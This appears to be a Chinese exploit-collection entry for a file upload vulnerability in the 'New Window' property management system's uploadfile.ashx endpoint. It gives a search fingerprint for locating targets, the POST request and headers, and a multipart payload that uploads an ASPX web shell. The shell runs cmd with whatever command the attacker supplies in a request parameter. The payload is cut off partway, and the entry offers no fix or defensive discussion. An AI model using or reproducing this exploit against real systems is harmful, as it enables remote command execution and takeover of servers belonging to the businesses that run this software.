# 新视窗新一代物业管理系统uploadfile.ashx存在文件上传漏洞

- **系统**：新视窗新一代物业管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="BPMSite/ClientSupport/OCXInstall.aspx"`
- **请求**：`POST /script/uploadify/uploadfile.ashx?id=1 HTTP/1.1`
- **关键头**：`Priority: u=0, i`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWQPGtgGb…`

**请求体 / payload**
```
------WebKitFormBoundaryWQPGtgGbo1eMeYgQ
Content-Disposition: form-data; name="Filedata" filename="1.aspx"
Content-Type: application/octet-stream
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.Re…（脚本共 717 字，完整版见原文）
```
- **预期**：200　|　—